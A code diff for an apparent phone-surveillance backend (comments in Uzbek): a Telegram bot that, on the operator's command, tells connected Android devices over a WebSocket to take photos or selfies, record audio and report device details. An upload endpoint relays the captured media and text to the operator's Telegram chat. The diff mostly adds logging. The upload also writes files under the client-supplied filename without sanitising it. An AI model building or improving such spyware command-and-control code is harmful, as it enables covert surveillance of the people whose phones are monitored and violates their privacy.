@@ -1,5 +1,7 @@
 import asyncio
 import os
+import logging
+import traceback
 from contextlib import asynccontextmanager
 from typing import Set
 
@@ -12,19 +14,31 @@ from aiogram.types import FSInputFile, ReplyKeyboardMarkup, KeyboardButton
 from dotenv import load_dotenv
 load_dotenv()
 
-# --- Configuration ---
-BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
-ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))
+# ─── LOGGING SOZLASH ──────────────────────────────────────────────────────────
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%H:%M:%S"
+)
+log = logging.getLogger("bot")
 
-# --- Global State ---
+# ─── SOZLAMALAR ───────────────────────────────────────────────────────────────
+BOT_TOKEN = os.getenv("BOT_TOKEN", "")
+ADMIN_ID  = int(os.getenv("ADMIN_ID", "0"))
+
+log.info("=" * 50)
+log.info(f"BOT_TOKEN: {'OK' if BOT_TOKEN else 'YOQ !!!'}")
+log.info(f"ADMIN_ID:  {ADMIN_ID if ADMIN_ID else 'YOQ !!!'}")
+log.info("=" * 50)
+
+# ─── GLOBAL HOLAT ─────────────────────────────────────────────────────────────
 connected_devices: Set[WebSocket] = set()
 
-# --- Aiogram Setup ---
 bot = Bot(token=BOT_TOKEN)
-dp = Dispatcher()
+dp  = Dispatcher()
+
 
 def get_main_keyboard():
-    # Tugmalar yaratish
     kb = [
         [KeyboardButton(text="📸 Rasm olish"), KeyboardButton(text="🤳 Selfie")],
         [KeyboardButton(text="🎙 Ovoz yozish (10 sek)")],
@@ -32,18 +46,21 @@ def get_main_keyboard():
     ]
     return ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
 
+
+# ─── BOT HANDLERLAR ────────────────────────────────────────────────────────────
 @dp.message(Command("start"))
 async def start_handler(message: types.Message):
-    print(f"[DEBUG] Yozgan foydalanuvchi ID si: {message.from_user.id}")
-    print(f"[DEBUG] Tizimdagi ADMIN_ID: {ADMIN_ID}")
+    log.info(f"/start → user_id={message.from_user.id}, admin_id={ADMIN_ID}")
     if message.from_user.id != ADMIN_ID:
-        print("[DEBUG] ID mos kelmadi! Shuning uchun bot javob qaytarmadi.")
+        log.warning(f"Notanish foydalanuvchi: {message.from_user.id}")
         return
-    print("[DEBUG] ID to'g'ri keldi, javob yuborilmoqda...")
+    devices_count = len(connected_devices)
+    log.info(f"Admin kirdi. Ulangan qurilmalar: {devices_count}")
     await message.answer(
-        "Kuzatuv tizimi faol! 👇 Quyidagi tugmalardan birini tanlang:",
+        f"Kuzatuv tizimi faol!\nUlangan qurilmalar: {devices_count} ta\n\nQuyidagi tugmalardan birini tanlang:",
         reply_markup=get_main_keyboard()
     )
+
 
 @dp.message(F.text.in_({
     "📸 Rasm olish", "🤳 Selfie",
@@ -51,85 +68,111 @@ async def start_handler(message: types.Message):
     "🔋 Batareya", "📱 Qurilma info"
 }))
 async def action_handler(message: types.Message):
-    """Tugma bosilganda ushbu funksiya ishlaydi"""
     global connected_devices
-    
     if message.from_user.id != ADMIN_ID:
         return
-    
+
+    log.info(f"Buyruq: '{message.text}' | Ulangan qurilmalar: {len(connected_devices)}")
+
     if not connected_devices:
-        await message.answer("⚠️ Diqqat: Qurilma hozir tarmoqda emas (Internet o'chiq bo'lishi mumkin).")
+        log.warning("Qurilma yo'q — buyruq yuborilmadi")
+        await message.answer("⚠️ Diqqat: Qurilma hozir tarmoqda emas.")
         return
 
-    # Bosilgan tugmaga qarab qurilmaga jo'natiladigan signalni tanlaymiz
     command_map = {
-        "📸 Rasm olish": "take_photo",
-        "🤳 Selfie": "selfie",
+        "📸 Rasm olish":        "take_photo",
+        "🤳 Selfie":            "selfie",
         "🎙 Ovoz yozish (10 sek)": "record_audio",
-        "🔋 Batareya": "battery",
-        "📱 Qurilma info": "device_info",
+        "🔋 Batareya":          "battery",
+        "📱 Qurilma info":      "device_info",
     }
     action = command_map[message.text]
-    
-    # Barcha ulangan qurilmalarga (telefonlarga) signal jo'natish
+
     disconnected = set()
+    sent = 0
     for device in set(connected_devices):
         try:
             await device.send_text(action)
+            sent += 1
+            log.info(f"'{action}' yuborildi → qurilma #{sent}")
         except Exception as e:
-            print(f"Xabar yuborishda xatolik: {e}")
+            log.error(f"Qurilmaga yuborishda xatolik: {e}")
             disconnected.add(device)
     connected_devices -= disconnected
 
-    await message.answer(f"⏳ Buyruq qurilmaga yuborildi: {message.text}. Iltimos kuting...")
+    await message.answer(f"⏳ Buyruq yuborildi: {message.text} ({sent} qurilma)")
 
-# --- FastAPI Setup ---
+
+# ─── FASTAPI ──────────────────────────────────────────────────────────────────
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-    # Start bot polling in the background when FastAPI starts
+    log.info("FastAPI ishga tushdi. Bot polling boshlanmoqda...")
     polling_task = asyncio.create_task(dp.start_polling(bot))
     yield
-    # Stop polling gracefully when FastAPI stops
     polling_task.cancel()
     await bot.session.close()
+    log.info("FastAPI to'xtadi.")
 
 app = FastAPI(lifespan=lifespan)
+
 
 @app.websocket("/ws/device")
 async def websocket_endpoint(websocket: WebSocket):
     await websocket.accept()
     connected_devices.add(websocket)
-    print("New device connected via WebSocket.")
+    client = websocket.client
+    log.info(f"Yangi qurilma ulandi: {client} | Jami: {len(connected_devices)} ta")
     try:
         while True:
             data = await websocket.receive_text()
-            pass
+            log.info(f"Qurilmadan xabar: {data[:80]}")
     except WebSocketDisconnect:
-        connected_devices.remove(websocket)
-        print("Device disconnected.")
+        connected_devices.discard(websocket)
+        log.info(f"Qurilma uzildi: {client} | Qolganlar: {len(connected_devices)} ta")
+    except Exception as e:
+        connected_devices.discard(websocket)
+        log.error(f"WebSocket xatolik: {e}")
+
 
 async def send_media_to_admin(file_path: str, media_type: str):
-    """Olingan faylni turiga qarab adminga yuborish va o'chirish"""
+    log.info(f"Telegramga yuborilmoqda: {media_type} | Fayl: {file_path}")
     try:
+        if not os.path.exists(file_path):
+            log.error(f"Fayl topilmadi: {file_path}")
+            return
+        size = os.path.getsize(file_path)
+        log.info(f"Fayl hajmi: {size} bayt")
+        if size < 10:
+            log.error(f"Fayl juda kichik ({size} bayt) — yuborilmadi")
+            return
+
         media = FSInputFile(file_path)
         if media_type == "photo":
             await bot.send_photo(chat_id=ADMIN_ID, photo=media, caption="📸 Kamera surati")
+            log.info("Rasm Telegramga yuborildi ✅")
         elif media_type == "audio":
             await bot.send_voice(chat_id=ADMIN_ID, voice=media, caption="🎙 Ovozli yozuv")
+            log.info("Audio Telegramga yuborildi ✅")
         elif media_type == "video":
-            await bot.send_video(chat_id=ADMIN_ID, video=media, caption="🎥 Qisqa video")
+            await bot.send_video(chat_id=ADMIN_ID, video=media, caption="🎥 Video")
+            log.info("Video Telegramga yuborildi ✅")
     except Exception as e:
-        print(f"Telegramga yuborish xatosi: {e}")
+        log.error(f"Telegramga yuborishda XATOLIK: {e}")
+        log.error(traceback.format_exc())
     finally:
         if os.path.exists(file_path):
             os.remove(file_path)
+            log.info(f"Vaqtinchalik fayl o'chirildi: {file_path}")
+
 
 async def send_text_to_admin(text: str):
-    """Matn ma'lumotlarini adminga yuborish"""
+    log.info(f"Matn yuborilmoqda: {text[:80]}")
     try:
         await bot.send_message(chat_id=ADMIN_ID, text=text)
+        log.info("Matn Telegramga yuborildi ✅")
     except Exception as e:
-        print(f"Matn yuborishda xatolik: {e}")
+        log.error(f"Matn yuborishda XATOLIK: {e}")
+
 
 @app.post("/upload")
 async def upload_media(
@@ -138,16 +181,27 @@ async def upload_media(
     file: UploadFile = File(None),
     text: str = Form(None)
 ):
-    """Android qurilmadan fayl yoki matn qabul qilish"""
-    if media_type == "text" and text:
-        background_tasks.add_task(send_text_to_admin, text)
-    elif file:
-        file_location = f"temp_{file.filename}"
-        with open(file_location, "wb+") as file_object:
-            file_object.write(await file.read())
-        background_tasks.add_task(send_media_to_admin, file_location, media_type)
+    log.info(f"/upload keldi → media_type='{media_type}', file={file.filename if file else None}, text={str(text)[:50] if text else None}")
+    try:
+        if media_type == "text" and text:
+            background_tasks.add_task(send_text_to_admin, text)
+        elif file:
+            file_location = f"temp_{file.filename}"
+            content = await file.read()
+            log.info(f"Fayl qabul qilindi: {len(content)} bayt")
+            with open(file_location, "wb") as f:
+                f.write(content)
+            background_tasks.add_task(send_media_to_admin, file_location, media_type)
+        else:
+            log.warning("Upload: fayl ham, matn ham yo'q!")
+            return JSONResponse(content={"status": "empty"})
 
-    return JSONResponse(content={"status": "success"})
+        return JSONResponse(content={"status": "success"})
+    except Exception as e:
+        log.error(f"/upload xatolik: {e}")
+        log.error(traceback.format_exc())
+        return JSONResponse(content={"status": "error", "detail": str(e)}, status_code=500)
+
 
 if __name__ == "__main__":
     import uvicorn
